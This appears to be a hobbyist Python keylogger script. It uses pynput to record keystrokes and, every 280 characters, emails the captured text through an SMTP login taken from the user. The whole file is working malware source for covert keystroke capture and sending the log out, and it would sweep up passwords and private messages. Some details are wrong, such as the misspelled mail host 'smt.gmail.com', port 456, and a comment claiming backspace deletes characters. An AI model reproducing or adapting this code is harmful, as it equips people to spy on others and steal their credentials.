from pynput.keyboard import Key, \
    Listener  # A library I found that control and monitors input devices (mouse/keyboard input and monitoring)
import getpass  # Library that makes password non-visible and keeps hidden from being logged
import smtplib  # Protocol library for email

#
email = input('Enter email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
# Information required for email connection
server = smtplib.SMTP_SSL('smt.gmail.com', 456)
server.login(email, password)

# Logging input as strings to be looped
key_log = ''
word = ''
email_character_limit = 280  # Chose a character limit of 280 based on twitters tweet limit


# Function for recording keystrokes
def on_press(key):
    global word
    global key_log
    global email
    global email_character_limit

    # If user presses space or enter the function then adds a space after adding to the word count
    if key == Key.space or key == Key.enter:
        word += ' '
        key_log += word
        word = ''
        if len(key_log) >= email_character_limit:
            send_log()
            key_log = ''
    # Disregard user input of left or right
    elif key == Key.shift_l or key == Key.shift_r:
        return
    # If user presses backspace it'll remove that character from the log
    elif key == Key.backspace:
        return
    # Takes user input, removes quotes around character then stores it in 'word' logger
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    # Use esc to exit loop
    if key == Key.esc:
        return False


def send_log():
    # Deliver as following (email you want to send to, email you want to send from, and item)
    # want to send and receive to self as a way to test program
    server.sendmail(email, email, key_log)


# function that monitors keypress from pynput
with Listener(on_press=on_press) as listener:
    listener.join()
